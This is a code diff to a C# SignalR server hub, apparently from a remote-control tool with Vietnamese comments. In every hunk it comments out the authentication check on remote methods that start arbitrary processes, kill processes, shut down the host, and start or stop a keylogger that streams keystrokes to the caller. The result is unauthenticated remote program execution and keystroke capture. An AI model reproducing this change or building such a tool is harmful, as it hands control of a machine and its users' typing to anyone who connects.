@@ -121,7 +121,7 @@ namespace Server.Hubs
 
         public async Task GetProcessList(bool isAppOnly)
         {
-            if (!await IsAuthenticated()) return;
+            //if (!await IsAuthenticated()) return;
             var list = _systemService.ListProcessOrApp(isAppOnly);
             // Gửi kết quả về cho người gọi (Caller)
             string json = JsonHelper.ToJson(list);
@@ -130,21 +130,21 @@ namespace Server.Hubs
 
         public async Task StartProcess(string path)
         {
-            if (!await IsAuthenticated()) return;
+            //if (!await IsAuthenticated()) return;
             bool result = _systemService.startProcessOrApp(path);
             await Clients.Caller.SendAsync("ReceiveStatus", "START", result, result ? "Đã gửi lệnh mở" : "Lỗi mở file");
         }
 
         public async Task KillProcess(int id)
         {
-            if (!await IsAuthenticated()) return;   
+            //if (!await IsAuthenticated()) return;   
             bool result = _systemService.killProcessOrApp(id);
             await Clients.Caller.SendAsync("ReceiveStatus", "KILL", result, result ? "Đã diệt thành công" : "Không thể diệt");
         }
 
         public async Task ShutdownServer(bool isRestart)
         {
-            if (!await IsAuthenticated()) return;
+           // if (!await IsAuthenticated()) return;
             bool result = _systemService.shutdownOrRestart(isRestart);
             await Clients.Caller.SendAsync("ReceiveStatus", "POWER", result, "Đang thực hiện lệnh nguồn...");
         }
@@ -205,7 +205,7 @@ namespace Server.Hubs
 
         public async Task StartKeyLogger()
         {
-            if (!await IsAuthenticated()) return;
+            //if (!await IsAuthenticated()) return;
             string connectionId = Context.ConnectionId;
             
             // Bắt đầu lắng nghe và gửi từng phím về Client
@@ -219,7 +219,7 @@ namespace Server.Hubs
 
         public async Task StopKeyLogger()
         {
-            if (!await IsAuthenticated()) return;
+            //if (!await IsAuthenticated()) return;
             _inputService.StopKeyLogger();
             await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", false, "Keylogger đã dừng.");
         }
